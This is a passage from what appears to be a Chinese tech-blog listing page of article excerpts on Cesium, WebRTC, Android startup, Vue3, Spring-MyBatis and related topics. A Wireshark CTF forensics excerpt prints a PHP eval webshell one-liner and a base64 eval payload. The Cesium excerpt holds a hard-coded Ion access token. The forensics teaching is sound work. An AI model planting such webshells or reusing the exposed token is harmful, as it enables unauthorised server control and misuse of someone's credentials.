具体实现 1.初始化cesium init(el) { Cesium.Ion.defaultAccessToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiIyMGFhNTBjMi1kNGM4LTRjYWQtYWZhMC05ZTJhY2U2Y2U0ODkiLCJpZCI6MzE2MzYsImlhdCI6MTY2MDcxODA4NX0.jljbTXZPBaeSdsU7vuWg8V01oV1-fEA_qUa_08wXvq0" this.viewer = new Cesium.Viewer(el, { animation: false, //是否显示动画控件,左下角仪表 baseLayerPicker: false, //是否显示图层选择器 fullscreenButton: false, //是否显示全屏按钮 geocoder: false, //是否显示geocoder小器件，右上角查询按钮 homeButton: false, //是否显示Home按钮 infoBox: false, //是否显示信息框 sceneModePicker: false, //是否显示3D/2D选择器 scene3DOnly: true, //如果设置为true，则所有几何图形以3D模式绘制以节约GPU资源 selectionIndicator: false, //是否显示选取指示器组件 timeline: false, //是否显示时间轴 navigationHelpButton: false, //是否显示右上角的帮助按钮 baselLayerPicker: false, // 将图层选择的控件关掉，才能添加其他影像数据 shadows: true, //是否显示背影 shouldAnimate: true, skyBox: new Cesium.SkyBox({ sources: { positiveX: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64504f9fd0d37f1315217fd3563f2127/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b3934c75e6910ff847ad842e025bab9/" rel="bookmark">
			WebRTC线程介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. 线程模型 WebRTC 有三类线程：信令线程，网络线程，工作线程。
信令线程一般工作在 PeerConnection 层，它负责与应用层交互，例如 createOffer，createAnswer 等操作，并通知工作线程和网络线程相应的信号事件。
网络线程工作在网络传输层，它负责网络收发包，从网络接收包数据并发送给工作线程，工作线程也会把要发送的包数据给网络线程。
工作线程工作在媒体引擎层（engine），包含视频采集线程，视频渲染线程，视频编码线程，视频解码线程等。
二. 线程创建与启动 使用 webrtc::CreatePeerConnectionFactory 创建 PeerConnectionFactoryInterface 时有 network_thread，worker_thread，signaling_thread 参数可以让我们指定使用的 Thread 对象，当传递 nullptr 时表示希望函数内部帮助我们创建并启动对应的线程。
如果传入的 network_thread 为空则使用 rtc::Thread::CreateWithSocketServer() 创建 Thread 对象，如果传入的 worker_thread 为空则使用 rtc::Thread::Create() 创建 Thread 对象，如果传入的 signaling_thread 为空则使用 rtc::Thread::Current() 对其进行赋值。
Thread 构造函数逻辑主要是将该 Thread 对象添加到 ThreadManager 中进行管理。
线程创建与启动逻辑如下，对于 Windows 使用 CreateThread 创建线程，对于使用 POSIX 方式的系统则使用 pthread_create 创建线程，线程创建后都运行 PreRun 函数。
bool Thread::Start() { RTC_DCHECK(!IsRunning()); if (IsRunning()) return false; Restart(); // reset IsQuitting() if the thread is being restarted // Make sure that ThreadManager is created on the main thread before // we start a new thread.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b3934c75e6910ff847ad842e025bab9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f49675d515a3d7b36fbf44992b32553/" rel="bookmark">
			Android应用启动全流程分析（源码深度剖析）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.前言 从用户手指点击桌面上的应用图标到屏幕上显示出应用主Activity界面而完成应用启动，快的话往往都不需要一秒钟，但是这整个过程却是十分复杂的，其中涉及了Android系统的几乎所有核心知识点。同时应用的启动速度也绝对是系统的核心用户体验指标之一，多少年来，无论是谷歌或是手机系统厂商们还是各个Android应用开发者，都在为实现应用打开速度更快一点的目标而不断努力。但是要想真正做好应用启动速度优化这件事情，我想是必须要对应用启动的整个流程有充分的认识和理解的，所以无论作为Android系统或应用开发者，都有必要好好的学习和了解一下这个过程的。网上有很多介绍应用启动流程源码的文章，但是总感觉大多数都不太全面，很多只是介绍了应用启动过程中的部分流程，而没有总体清晰的认识应用启动过程的总体脉络与系统架构设计思想。所以本文将结合笔者多年来的工作经历，结合systrace分析工具，基于最新Android R AOSP源码完整的分析一下这个从用户手指触控点击屏幕应用图标到应用界面展示到屏幕上的整个应用启动过程，也是对之前所做所学的一个总结与归纳。
2.大纲 Android触控事件处理机制
Zygote进程启动和应用进程创建流程
Handler消息机制
AMS的Activity组件管理
应用Application和Activity组件创建与初始化
应用UI布局与绘制
RenderThread渲染
SurfaceFlinger合成显示
写在最后
参考
3. Input触控事件处理流程 3.1 系统机制分析 Android 系统是由事件驱动的，而 input 是最常见的事件之一，用户的点击、滑动、长按等操作，都属于 input 事件驱动，其中的核心就是 InputReader 和 InputDispatcher。InputReader 和 InputDispatcher 是跑在 SystemServer进程中的两个 native 循环线程，负责读取和分发 Input 事件。整个处理过程大致流程如下：
InputReader负责从EventHub里面把Input事件读取出来，然后交给 InputDispatcher 进行事件分发；InputDispatcher在拿到 InputReader获取的事件之后，对事件进行包装后，寻找并分发到目标窗口;InboundQueue队列（“iq”）中放着InputDispatcher从InputReader中拿到的input事件；OutboundQueue（“oq”）队列里面放的是即将要被派发给各个目标窗口App的事件；WaitQueue队列里面记录的是已经派发给 App（“wq”），但是 App还在处理没有返回处理成功的事件；PendingInputEventQueue队列（“aq”）中记录的是应用需要处理的Input事件，这里可以看到input事件已经传递到了应用进程；deliverInputEvent 标识 App UI Thread 被 Input 事件唤醒；InputResponse 标识 Input 事件区域，这里可以看到一个 Input_Down 事件 + 若干个 Input_Move 事件 + 一个 Input_Up 事件的处理阶段都被算到了这里；App 响应处理Input 事件，内部会在其界面View树中传递处理。 用一张图描述整个过程大致如下
3.2 结合Systrace分析 从桌面点击应用图标启动应用，system_server的native线程InputReader首先负责从EventHub中利用linux的epolle机制监听并从屏幕驱动读取上报的触控事件，然后唤醒另外一条native线程InputDispatcher负责进行进一步事件分发。InputDispatcher中会先将事件放到InboundQueue也就是“iq”队列中，然后寻找具体处理input事件的目标应用窗口，并将事件放入对应的目标窗口OutboundQueue也就是“oq”队列中等待通过SocketPair双工信道发送到应用目标窗口中。最后当事件发送给具体的应用目标窗口后，会将事件移动到WaitQueue也就是“wq”中等待目标应用处理事件完成，并开启倒计时，如果目标应用窗口在5S内没有处理完成此次触控事件，就会向system_server报应用ANR异常事件。以上整个过程在Android系统源码中都加有相应的systrace tag，如下systrace截图所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f49675d515a3d7b36fbf44992b32553/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/093f225b8eaf921f59c82dca0110527c/" rel="bookmark">
			python语言中“缩进”说法,python中的缩进规则
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇文章给大家谈谈python语言中“缩进”说法，以及python中的缩进规则，希望对各位有所帮助，不要忘了收藏本站喔。
python的缩进规则：对于类定义、函数定义、流程控制语句、异常处理语句等，行尾的冒号和下一行的缩进，表示下一个代码块的开始，而缩进的结束则表示此代码块的结束。通常情况下都是采用4个空格长度作为一个缩进量（一个Tab键就表示4个空格）神码ai智能写作介绍。
一，Python缩进长度及缩进字符。
看到网上一些Python缩进的错误示范，“tab符和空格不能混用”，“缩进一定是4个空格”下列演示。 ​
def change(a): print(id(a)) # 指向的是同一个对象(tab缩进) a=10 print(id(a)) # 一个新对象(4个空格缩进) a=1 print(id(a)) change(a) 空格和tab符都是以空格形式显示。如果在实际项目中混用，代码容易产生混淆，会增加在日后项目中维护和调试的困难，会降低代码的可读性。
二，Python代码缩进规则
物理行和逻辑行的概念 物理行是你在编写程序时所看见的。 逻辑行是Python看见的单个语句。Python假定每个物理行对应一个逻辑行 。 默认地，Python希望每行都只使用一个语句，这样使得代码更加易读。 如果你想要在一个物理行中使用多于一个逻辑行，那么你需要使用分号（;）来特别地标 明这种用法。分号表示一个逻辑行/语句的结束。
#例如：
i = 5 print i #与下面这个相同： i = 5; print i; #同样也可以写成： i = 5; print i; #甚至可以写成： i = 5; print i 然而，我强烈建议你坚持在每个物理行只写一句逻辑行。仅仅当逻辑行太长的时候，在多于一个物理行写一个逻辑行。这些都是为了尽可能避免使用分号，从而让代码更加易读。事实上，我从来没有 在Python程序中使用过或看到过分号。
下面是一个在多个物理行中写一个逻辑行的例子。它被称为明确的行连接()。
下面是一个在多个物理行中写一个逻辑行的例子。它被称为明确的行连接()。
s = 'This is a string. \ This continues the string.' print s 它的输出： This is a string.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/093f225b8eaf921f59c82dca0110527c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9383dcfec8977b4b2103b76e4f4bc367/" rel="bookmark">
			【网络云盘客户端】——项目简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目简介 网络云盘客户端时基于QT/C++框架实现了一个网络云盘客户端软件，主要功能包括用户的注册，登录，显示用户的个人文件列表，以及文件的上传，下载，删除，共享文件。
登录界面 主窗口界面 文件属性对话框 文件展示列表 上传文件 详细实现参考：
【QT网络云盘】——设计登录界面
【QT 网络云盘客户端】——登录界面功能的实现
【QT 网络云盘客户端】——主窗口界面的设计
【QT 网络云盘客户端】——实现文件属性窗口
【QT 网络云盘客户端】——获取用户文件列表信息
【网络云盘客户端】——上传文件的功能的实现
github链接：
Cloud-disk/logindialog at master · sjp1237/Cloud-disk (github.com)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eef480f9008814ecd3f0d10f9fa41b06/" rel="bookmark">
			UG/NX二次开发从业人员的职业规划
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		UG/NX二次开发是一项具有广泛应用和发展前景的技术领域，对于从业人员来说，制定合理的职业规划是实现个人职业发展和成就的关键。本文将探讨UG/NX二次开发从业人员的职业规划。
建立坚实的基础：作为UG/NX二次开发从业人员，首先要建立扎实的基础知识。深入了解UG/NX软件的功能和特点，掌握相关的编程语言和开发工具，熟悉UG/NX二次开发的原理和方法。通过系统学习和实践，建立起扎实的技术基础，为职业规划打下坚实的基础。
不断学习和提升技能：UG/NX二次开发是一个不断进步和演变的领域，从业人员需要不断学习和跟进最新的技术和发展趋势。通过参加培训课程、研讨会、技术论坛等活动，持续提升自己的技能和知识水平。同时，积极参与项目实践，通过实际项目的经验积累和问题解决，不断提高自己的实际操作能力。
多领域实践和经验积累：UG/NX二次开发的应用领域广泛，从汽车制造到航空航天、机械制造到电子产品等等。从业人员可以选择在特定领域进行深入的二次开发实践，积累丰富的行业经验。通过参与不同项目和行业的开发工作，掌握各种应用场景和需求，提高自己的问题解决能力和创新能力。
发展领导和管理能力：随着职业发展的不断深入，UG/NX二次开发从业人员有机会承担更多的责任和角色。发展领导和管理能力将有助于从业人员在团队中发挥更大的作用，带领团队完成复杂的开发项目。通过学习项目管理、团队协作和沟通技巧，提升自己的领导力和管理能力，为职业发展打下坚实的基础。
持续关注行业动态和趋势：UG/NX二次开发行业发展迅速，技术不断更新和演进。从业人员应该保持对行业动态和趋势的持续关注，了解最新的技术和应用方向。通过积极参与行业交流和社区讨论，与同行交流经验和观点，不断拓宽自己的视野，保持敏锐的行业洞察力。
持续自我反思和发展：职业规划是一个持续的过程，从业人员应该时刻进行自我反思和发展。定期评估自己的职业发展目标和进展情况，及时调整和修正职业规划。同时，关注个人的兴趣和激情，将其与UG/NX二次开发的职业发展相结合，找到适合自己的发展方向和机会。
UG/NX二次开发从业人员的职业规划需要综合考虑技术能力、行业经验、领导力和市场需求等因素。通过建立坚实的基础、持续学习和提升技能、多领域实践和经验积累、发展领导和管理能力、关注行业动态和趋势以及持续自我反思和发展，从业人员可以实现个人职业规划的目标，并在UG/NX二次开发领域取得成功。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ad473450e7b350bf304aee6540f3febd/" rel="bookmark">
			关于UG/NX二次开发的历史和发展前景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		UG/NX是一款广泛应用于计算机辅助设计与制造领域的软件，具有强大的二次开发能力。本文将介绍UG/NX二次开发的历史和发展前景。
一、UG/NX二次开发的历史 UG/NX最初由美国UGS公司（后被西门子收购）开发，是一款集成了CAD、CAM和CAE功能的综合性软件。UG/NX在设计、制造和工程分析领域具有广泛的应用，被许多制造企业和工程师所采用。
随着UG/NX的不断发展，用户对软件的个性化需求也越来越高。为了满足用户的特定需求，UG/NX提供了强大的二次开发功能，使用户可以根据自身需求对软件进行定制和扩展。
UG/NX二次开发的历史可以追溯到软件推出的早期阶段。最初，UG/NX的二次开发主要是通过编写自定义的宏命令和脚本来实现。这些宏命令和脚本可以自动化一些重复性的任务，提高工作效率。
随着时间的推移，UG/NX的二次开发工具不断完善和增强。UG/NX提供了一系列的API（应用程序接口），包括基于C++的UG/Open和基于.NET的NX Open，使开发者可以通过编程方式与UG/NX进行交互。
UG/Open是UG/NX最早引入的二次开发接口，它提供了丰富的函数库和对象模型，可以实现对UG/NX的各种操作和功能扩展。UG/Open的出现极大地促进了UG/NX二次开发的发展，许多企业和个人开始利用UG/Open进行定制开发，以满足自身的特定需求。
后来，UG/NX引入了基于.NET的NX Open，这是一种更现代化和强大的二次开发接口。基于.NET的NX Open支持多种编程语言（如C#和VB.NET），提供了更友好的开发环境和更丰富的功能库，使开发者能够更高效地进行UG/NX的二次开发。
随着UG/NX二次开发工具的不断完善和用户对定制化需求的增加，越来越多的企业和个人开始利用UG/NX的二次开发功能进行定制开发，以适应不同行业和应用领域的需求。
二、UG/NX二次开发的发展前景 UG/NX作为一款成熟的CAD/CAM/CAE软件，具有广泛的用户群体和应用领域。UG/NX二次开发在满足用户个性化需求和提升工作效率方面发挥着重要作用。下面将讨论UG/NX二次开发的发展前景。
提供个性化定制解决方案：UG/NX二次开发使用户能够根据自身需求对软件进行定制和扩展。随着不同行业和应用领域对CAD/CAM/CAE软件需求的不断增加，UG/NX二次开发将继续为用户提供个性化定制解决方案，满足特定的行业和应用需求。
提高工作效率：UG/NX二次开发可以自动化一些重复性的任务，提高工作效率。通过开发自定义的工具和功能，用户可以简化复杂的操作流程，减少人工操作的错误和繁琐性，从而提高工作效率和质量。
扩展软件功能：UG/NX二次开发使用户能够扩展软件的功能，满足特定的设计和制造需求。用户可以根据自身业务流程和工作方式，开发定制的功能和插件，使UG/NX适应不同行业和应用领域的要求。
促进创新和技术发展：UG/NX二次开发为用户提供了广阔的创新空间。通过开发新的工具、算法和功能，用户可以在设计和制造过程中实现更高的效率和精度，促进技术的不断发展和创新。
强大的开发社区支持：UG/NX拥有庞大的用户社区和开发者社区，提供了丰富的资源和支持。在这个社区中，用户可以分享经验、交流问题，并获得来自其他开发者和用户的帮助和指导。
综上所述，UG/NX二次开发具有悠久的历史和广阔的发展前景。随着用户对个性化定制需求的增加和技术的不断进步，UG/NX二次开发将继续发挥重要作用，为用户提供个性化定制解决方案，提高工作效率，促进创新和技术发展。对于有志于深入应用UG/NX的企业和个人来说，掌握UG/NX二次开发技术将成为一项重要的竞争优势。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/06041c627a39aa4b318ae09a8deff2bf/" rel="bookmark">
			python实战项目1—字符画
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 文章目录
前言
一、本次学习须知
二、项目学习
1.导入库
2.拆分 gif 将每一帧处理成字符画
3.清空 tmp 目录下内容
4.将不同的灰度值映射为 ASCII 字符
5.将图片处理成字符画
6. 创建新画布
7.读取 tmp 目录下文件合成 gif
8.主函数部分
9.使用项目前需读
10.具体实现内容
三，总结
前言 在现代社会，计算机技术正在深刻地影响我们的生活和工作。尤其对于计算机爱好者、程序员和开发者而言，Python编程语言是一个极具吸引力的选择。Python是一种易学易用且功能强大的编程语言，通过实战项目的方式学习Python编程，可以让我们更深入地理解和掌握Python的核心概念和基本语法，帮助我们更快地提升编程技能。因此，在本文中，我们从第一个Python实战项目实战开始学习和使用，希望能对像我一样的初学者有所帮助。
本项目为本人第一次学习并编写的，作为自己的学习笔记，如有可改进的地方，望各为大佬指正，感谢！
一、本次学习须知 本项目较小，具有一定的python基础即可进行学习，初学者也可进行阅读并学习。
本项目分为代码块进行制作笔记与学习。
二、项目学习 1.导入库 代码如下：
1.os：该库提供了访问操作系统功能的方法，小写字母"o"和字母"s"之间没隔。 在这里，它被用来访问操作系统路径。
2.imageio：该库提供了一组用于读写图像和动态图像格式的函数。
在这段代码中，它被用来读取 图像文件。
3.PIL：该库是Python用于图像处理和图形操作的第三方库，可以使用各种图像特效处理图像，包 括缩放，旋转，裁剪和滤镜等。
在这段代码中，它被用来创建一个新图像，并在其上绘制文本。
下面是PIL库中的一些核心模块：
(1)Image：提供了一系列操作图像的类和方法，包括打开、保存、修改图像大小、裁剪等。
(2)ImageDraw：提供了绘制基本几何图形和文本的方法，例如绘制线、矩形、圆等。
(3)ImageFont：提供了字体选择、大小和渲染的功能，例如在图像中添加文本或标注。
总结:
(1)该代码的功能是使用PIL库创建一个空白图片，然后将文本写在图片上。
(2)使用 imageio 库将该图片保存为图像文件。
2.拆分 gif 将每一帧处理成字符画 代码如下：
1.打开一个名为 file 的图像文件，并将其加载到变量 im 中（使用 PIL 库中的 Image.open() 方法）。
2.存储当前工作目录到变量 path 中（使用 os.getcwd() 方法）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/06041c627a39aa4b318ae09a8deff2bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02ca521a40cdf2d904a8dea3737e1f13/" rel="bookmark">
			Wireshark流量分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.基本介绍
2.基本使用
1）数据包筛选:
2）筛选ip：
3）数据包还原
4）数据提取
3.wireshark实例
1.基本介绍 在CTF比赛中，对于流量包的分析取证是一种十分重要的题型。通常这类题目都是会提供一个包含流量数据的pcap文件，参赛选手通过该文件筛选和过滤其中无关的流量信息，根据关键流量信息找出flag或者相关线索。
pcap流量包的分析通常都是通过图形化的网络嗅探器——wireshark进行的，这款嗅探器经过众多开发者的不断完善，现在已经成为使用最为广泛的安全工具之一。接下来，斗哥来为大家讲解这款工具的基本使用。
2.基本使用 Wireshark的基本使用分为数据包筛选、数据包搜索、数据包还原、数据提取四个部分。
1）数据包筛选: 数据包筛选功能是wireshark的核心功能，比如需要筛选出特定的协议如HTTP，Telnet等，也可能需要筛选出ip地址，端口等。
2）筛选ip： ●源ip筛选
输入命令：ip.src == 地址
3）数据包还原 在wireshark中，存在一个交追踪流的功能，可以将HTTP或TCP流量集合在一起并还原成原始数据，具体操作方式如下：
选中想要还原的流量包，右键选中，选择追踪流 – TCP流/UPD流/SSL流/HTTP流。
可在弹出的窗口中看到被还原的流量信息
4）数据提取 Wireshark支持提取通过http传输（上传/下载）的文件内容，方法如下：
菜刀下载文件的流量，需要删除分组字节流前开头和结尾的X@Y字符，否则下载的文件会出错。鼠标右键点击 – 选中 显示分组字节…
在弹出的窗口中设置开始和结束的字节（原字节数开头加3，结尾减3）
最后点击save as按钮导出。
导出结果：
3.wireshark实例 题目要求：
1.黑客第一次获得的php木马的密码是什么
2.黑客第二次上传php木马是什么时间
3.第二次上传的木马通过HTTP协议中的哪个头传递数据
题目要求php木马的密码，首先我们要知道php一句话木马一般都是POST请求
所以我们直接过滤POST请求，发现这个IP请求了一个名为kkkaaa.php的php文件，很可疑
正常文件不会以此命名的， 打开数据包看一下，发现了这个字段
Form item: "zzz" = "@eval(base64_decode($_POST[z0]));"
上传的木马应该是：&lt;?php eval($_POST['zzz']);?&gt;
又将eval(base64_decode($_POST[z0]));传入zzz参数，目的是将z0传入的数据进行base64的解码此时z0传入base64编码后的数据，便可以执行恶意代码解码后发现执行了dirname函数，目的是查看当前路径下的文件或目录，类似linux下的ls命令
PHP代码是通过混淆过的，让我们根本看不懂他的代码
还原后的代码：
&lt;?php $kh = "cb42"; $kf = "e130"; function x($t, $k) { $c = strlen($k); $l = strlen($t); $o = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02ca521a40cdf2d904a8dea3737e1f13/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea8adfd3d87a8c1f7f29c33289de116c/" rel="bookmark">
			vue3的ref函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、ref函数 作用: 定义一个响应式的数据
语法: const xxx = ref(initValue)
创建一个包含响应式数据的引用对象（reference对象，简称ref对象）。
JS中操作数据： xxx.value
模板中读取数据: 不需要.value，直接：&lt;div&gt;{{xxx}}&lt;/div&gt;
备注：
接收的数据可以是：基本类型、也可以是对象类型。
基本类型的数据：响应式依然是靠Object.defineProperty()的get与set完成的。
对象类型的数据：内部 “ 求助 ” 了Vue3.0中的一个新函数—— reactive函数。这个reactive使用了ES6的Proxy对象
1）操作基本数据类型 1.其实ref(initValue)最终会创建的refImpl对象，这个对象的其实通过get、set方法赋值，我们通过修改该对象的_value就可以修改name的值，
2.那为啥模板插值语句不用name.value呢？
因为插值语句会自动解析它，比如它发现的该对象时refImpl这时候他会自动找到_value值展示
template&gt; &lt;h1&gt;一个人的信息&lt;/h1&gt; &lt;h2&gt;姓名：{{name}}&lt;/h2&gt; &lt;h2&gt;年龄：{{age}}&lt;/h2&gt; &lt;button @click="changeInfo"&gt;修改人的信息&lt;/button&gt; &lt;/template&gt; &lt;script&gt; import {ref} from 'vue' export default { name: 'App', setup(){ //数据 let name = ref('张三') let age = ref(18) //方法 function changeInfo(){ // name.value = '李四' // age.value = 48 console.log(name,age) } //返回一个对象（常用） return { name, age, changeInfo } } } &lt;/script&gt; 2）操作对象类型 按道理来说job对象的type也是一个ref对象，但是结果是job.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea8adfd3d87a8c1f7f29c33289de116c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9fbc79378e20a056399d1c0a59b328d3/" rel="bookmark">
			【推荐】Spring与Mybatis集成整合
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.概述
2.集成
2.1代码演示：
3.整合 3.1概述
3.2 进行整合分页
接着上两篇，我已经写了Mybatis动态之灵活使用，mybatis的分页和特殊字符的使用方式接下来把它们集成起来，是如何的呢👇👇👇。
1.概述 集成是指将不同的组件、系统或框架整合在一起，使它们能够协同工作，共同完成某个功能或提供某种服务。在软件开发中，集成通常指的是将多个独立的模块或组件整合在一起，形成一个完整的系统。
数据集成：将来自不同数据源的数据整合在一起，使其能够共享和共同使用。例如，将多个数据库的数据整合到一起，或将外部系统的数据与本地系统的数据整合。
系统集成：将不同的软件系统或模块整合在一起，使其能够协同工作，共同完成某个功能或提供某种服务。例如，将前端界面与后端逻辑进行集成，或将多个独立的微服务整合成一个完整的系统。框架集成：将不同的开发框架整合在一起，以提供更加便捷和灵活的开发方式。例如，将Spring框架与Mybatis框架进行集成，以实现依赖注入和数据库操作的统一管理。 服务集成：将不同的服务整合在一起，以提供更加全面和综合的服务。例如，将支付服务、物流服务和用户认证服务整合在一起，形成一个完整的电商平台。 集成的目的是提高系统的功能性、可扩展性和可维护性，减少重复开发和冗余代码，提高开发效率和系统性能。通过集成，不同的组件或系统可以共享资源和功能，实现更好的协同工作和互操作性。 2.集成 2.1代码演示： 创建一个maven项目，起名为ssm
在找到项目中pom.xml配置文件，配置引用插件，pom.xml配置如下 :
&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;ssm&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;name&gt;ssm Maven Webapp&lt;/name&gt; &lt;!-- FIXME change it to the project's website --&gt; &lt;url&gt;http://www.example.com&lt;/url&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;maven.compiler.plugin.version&gt;3.7.0&lt;/maven.compiler.plugin.version&gt; &lt;!--添加jar包依赖--&gt; &lt;!--1.spring 5.0.2.RELEASE相关--&gt; &lt;spring.version&gt;5.0.2.RELEASE&lt;/spring.version&gt; &lt;!--2.mybatis相关--&gt; &lt;mybatis.version&gt;3.4.5&lt;/mybatis.version&gt; &lt;!--mysql--&gt; &lt;mysql.version&gt;5.1.44&lt;/mysql.version&gt; &lt;!--pagehelper分页jar依赖--&gt; &lt;pagehelper.version&gt;5.1.2&lt;/pagehelper.version&gt; &lt;!--mybatis与spring集成jar依赖--&gt; &lt;mybatis.spring.version&gt;1.3.1&lt;/mybatis.spring.version&gt; &lt;!--3.dbcp2连接池相关 druid--&gt; &lt;commons.dbcp2.version&gt;2.1.1&lt;/commons.dbcp2.version&gt; &lt;commons.pool2.version&gt;2.4.3&lt;/commons.pool2.version&gt; &lt;!--4.log日志相关--&gt; &lt;log4j2.version&gt;2.9.1&lt;/log4j2.version&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9fbc79378e20a056399d1c0a59b328d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d5a0bb24830719312b332806b5870e2/" rel="bookmark">
			vue3的setup
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 理解：Vue3.0中一个新的配置项，值为一个函数。
setup是所有Composition API（组合API）“ 表演的舞台 ”。意思是说所有属性、方法、组件都放到setup
组件中所用到的：数据、方法等等，均要配置在setup中。
setup函数的两种返回值：
若返回一个对象，则对象中的属性、方法, 在模板中均可以直接使用。（重点关注！）
若返回一个渲染函数：则可以自定义渲染内容。（了解）
注意点：
尽量不要与Vue2.x配置混用
Vue2.x配置（data、methos、computed...）中可以访问到setup中的属性、方法。
但在setup中不能访问到Vue2.x配置（data、methos、computed...）。
如果有重名, setup优先。
setup不能是一个async函数，因为返回值不再是return的对象, 而是promise, 模板看不到return对象中的属性。（后期也可以返回一个Promise实例，但需要Suspense和异步组件的配合）
如果写了async的话就会报错
&lt;template&gt; &lt;h1&gt;一个人的信息&lt;/h1&gt; &lt;h2&gt;姓名：{{name}}&lt;/h2&gt; &lt;h2&gt;年龄：{{age}}&lt;/h2&gt; &lt;h2&gt;性别：{{sex}}&lt;/h2&gt; &lt;h2&gt;a的值是：{{a}}&lt;/h2&gt; &lt;/template&gt; &lt;script&gt; // import {h} from 'vue' export default { //当setup为async时 async setup(){ //数据 let name = '张三' let age = 18 let a = 200 //方法 function sayHello(){ alert(`我叫${name}，我${age}岁了，你好啊！`) } function test2(){ console.log(name) console.log(age) console.log(sayHello) console.log(this.sex) console.log(this.sayWelcome) } //返回一个对象（常用） return { name, age, sayHello, test2, a } //返回一个函数（渲染函数） // return ()=&gt; h('h1','北京') } } &lt;/script&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/076733fddabe208fd512144892f923a5/" rel="bookmark">
			Django图书馆信息管理系统-计算机毕设 附源码15363
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Django图书馆信息管理系统 摘 要 大数据时代下，数据呈爆炸式地增长。为了迎合信息化时代的潮流和信息化安全的要求，利用互联网服务于其他行业，促进生产，已经是成为一种势不可挡的趋势。在图书馆信息管理的要求下，开发一款整体式结构的图书馆信息管理系统，将复杂的系统进行拆分，能够实现对需求的变化快速响应、系统稳定性的保障，能保证平台可持续、规模化发展的要求。
论文针对图书馆图书信息的分布显示，管理员人员和用户需要对图书涉及到的信息进行分析的需求，设计了图书馆图书信息数据分析系统的框架，给出了图书馆图书信息数据分析系统的总体设计，并对图书馆图书信息数据分析系统的架构及关键模块的实现过程进行了详细论述。整个项目使用了Django技术，MySQL数据库等技术。系统解决了传统管理方式所带来的人力、物力和时间上的虚耗和交流深度的限定，这让交流的过程更快捷、准确、便利，同时完成图书馆信息管理系统的基本功能：新闻数据管理、用户注册管理、类别管理、图书管理、借阅管理、还书管理。
关键词：图书管理；整体式结构；Django；Mysql数据库
Django Library information management system
Abstract
In the age of big data, data is exploding. In order to meet the trend of information age and the requirements of information security, it has become an unstoppable trend to use the internet to serve other industries and promote production. Under the request of library information management, a library information management system with integrated structure is developed, which can realize the fast response to the change of demand and the guarantee of system stability, cAN guarantee the platform sustainable, the scale development request.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/076733fddabe208fd512144892f923a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95c876a87ed76ef602491e22a00a8aa7/" rel="bookmark">
			关于flutter中 initState() 与 setState() 用法
			</a>
		</h2>
		
	</header>
